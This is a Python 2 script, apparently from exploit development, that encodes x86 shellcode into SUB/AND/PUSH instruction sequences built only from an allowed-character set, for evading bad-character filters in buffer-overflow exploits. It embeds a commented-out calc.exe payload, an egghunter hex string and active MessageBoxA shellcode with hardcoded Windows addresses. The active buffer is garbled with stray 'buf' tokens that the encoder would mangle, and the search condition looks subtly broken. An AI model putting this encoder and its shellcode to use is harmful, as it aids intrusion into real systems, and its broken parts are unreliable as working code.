#!/usr/bin/env python

import sys
import os
from random import choice

### CHARACTERS THAT ARE ALLOWED ###
# goodchar =["00","28","29","2b","2d","2e","30","31","32","33","34","35","36","37","38","39","3f"]
# goodchar+=["41","42","43","44","45","46","47","48","49","4a"]
# goodchar+=["4b","4c","4d","4e","4f","50","51","52","53","54","55","56","57","58","59","5a","5b","5d","5e"]
# goodchar+=["61","62","63","64","65","66","67","68","69","6a","6b","6c"]
# goodchar+=["6d","6e","6f","70","71","72","73","74","75","76","77","78","79","7a","7e"]

goodchar = ["01","02","03","04","05","06","07","08","09","0b","0c","0e",
             "0f",
             "10","11","12","13","14","15","16","17","18","19","1a",
             "1b","1c","1d","1e","1f",
             "20","21","22","23","24","25","26",
             "27","28","29","2a","2b","2c","2d","2e",
             "30","31","32","33",
             "34","35","36","37","38","39","3b","3c","3d","3e","41","42",
             "43","44","45","46","47","48","49","4a","4b","4c","4d","4e",
             "4f","50","51","52","53","54","55","56","57","58","59","5a",
             "5b","5c","5d","5e","5f","60","61","62","63","64","65","66",
             "67","68","69","6a","6b","6c","6d","6e","6f","70","71","72",
             "73","74","75","76","77","78","79","7a","7b","7c","7d","7e",
             "7f"]


code = ''

def compl(hexvalue):
    return int("FFFFFFFF",16) - int(hexvalue,16)+1

def findvalues(code, carry, last):
    total = 9999999999
    wastetime = 99999
    while (total != int(code,16)):  
        a = choice(goodchar)
        b = choice(goodchar)
        c = choice(goodchar)
        total = int(a,16) + int(b,16) + int(c,16)+carry
        if (( total - 256 == int(code,16) ) and (last != 1) & wastetime < 1):
            return (a,b,c,1)
        wastetime += -1
    return (a,b,c,0)

def encode(x):
    global code  

    y = x
    endian    = (y[6] + y[7]) + (y[4] + y[5]) + (y[2] + y[3]) + (y[0] + y[1])
    twocompl = compl(endian)
    k = str(hex(twocompl))[2:99].strip("L")
    k = "0" * ( 8 - len(k) ) + k

    first = k[0:2]
    second= k[2:4]
    third = k[4:6]
    fourth= k[6:8]

    a = findvalues(fourth,0,0)
    b = findvalues(third,a[3],0)
    c = findvalues(second,b[3],0)
    d = findvalues(first,c[3],1)

    output = ''
    final  = ''
    for i in range(0,3):
        for k in (a,b,c,d):
            output += "\\x" + k[i]
        final += '\\x2d' + output
        output = ''

    code += r"\x25\x41\x41\x41\x41\x25\x3E\x3E\x3E\x3E"
    code += final
    code += r"\x50"

def main(shell):
    k = shell
    while ( len(k)/2 % 4 != 0):
        k += '90'
  
    z = ''
    line = ''
    rshell = []  
    for i in range(0, len(k), 8):
        for j in range(0,8):
            z += k[i + j]
        line = z + line
        rshell = [line] + rshell      
        line = ''
        z    = ''
    for i in rshell:
        encode(i)

### YOUR SHELLCODE HERE     ###
### NEEDS TO BE RAW STRINGS ###

# buf  =  ""
# buf += r"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b"
# buf += r"\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
# buf += r"\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20"
# buf += r"\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b"
# buf += r"\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0"
# buf += r"\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b"
# buf += r"\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01"
# buf += r"\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2"
# buf += r"\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"
# buf += r"\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b"
# buf += r"\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86"
# buf += r"\x5d\x6a\x01\x8d\x85\xb9\x00\x00\x00\x50\x68\x31\x8b"
# buf += r"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd"
# buf += r"\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
# buf += r"\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5\x63\x61\x6c\x63"
# buf += r"\x2e\x65\x78\x65\x00"
# buf = buf.replace("\\x","")

#buf = "6681caff0f42526a0258cd2e3c055a74efb85730305489d7af75eaaf75e7ffe7"

buf =  ""
buf += "buf31bufc0buf31bufdbbuf31bufc9buf31bufd2"
buf += "buf51buf68buf6cbuf6cbuf20buf20buf68buf33"
buf += "buf32buf2ebuf64buf68buf75buf73buf65buf72"
buf += "buf89bufe1bufbbbuf7bbuf1dbuf80buf7cbuf51" #// 0x7c801d7b ; LoadLibraryA(user32.dll)
buf += "bufffbufd3bufb9buf5ebuf67buf30bufefbuf81"
buf += "bufc1buf11buf11buf11buf11buf51buf68buf61"
buf += "buf67buf65buf42buf68buf4dbuf65buf73buf73"
buf += "buf89bufe1buf51buf50bufbbbuf40bufaebuf80" #// 0x7c80ae40 ; GetProcAddress(user32.dll, MessageBoxA)
buf += "buf7cbufffbufd3buf89bufe1buf31bufd2buf52"
buf += "buf51buf51buf52bufffbufd0buf31bufc0buf50"
buf += "bufb8buf12bufcbbuf81buf7cbufffbufd0"


main(buf)

print "eggshell  = \"\""
for i in range(0,len(code),4*16):
    print "eggshell += \"" + code[i:i + 4*16] + "\""
